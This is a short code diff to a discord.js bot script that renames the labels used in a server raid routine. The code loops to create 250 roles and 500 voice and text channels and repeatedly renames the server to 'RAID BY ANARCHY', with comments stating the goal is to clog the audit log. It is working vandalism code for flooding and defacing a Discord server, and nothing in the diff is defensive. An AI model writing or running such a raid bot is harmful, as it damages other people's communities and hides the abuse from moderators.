@@ -6,15 +6,15 @@ const Discord = require('discord.js');
             for (var i = 0; i < 250; i++) {
                 // Creates new roles to clog up the audit log
                 message.guild.createRole({
-                    name: 'FUCK',
+                    name: 'ANARCHY',
                     color: 'RED',
                 });
               }
                 for (var i = 0; i < 500; i++) {
-                message.guild.createChannel('Raid by Bowser jr', 'voice')
-                message.guild.createChannel('Raid by Bowser jr', 'text')
+                message.guild.createChannel('RAID BY ANARCHY', 'voice')
+                message.guild.createChannel('RAID BY ANARCHY', 'text')
                 //changes name tons of times to clog up the audit log
-                message.guild.setName("Raid by Bowser jr");
+                message.guild.setName("RAID BY ANARCHY");
                 }
             };
 
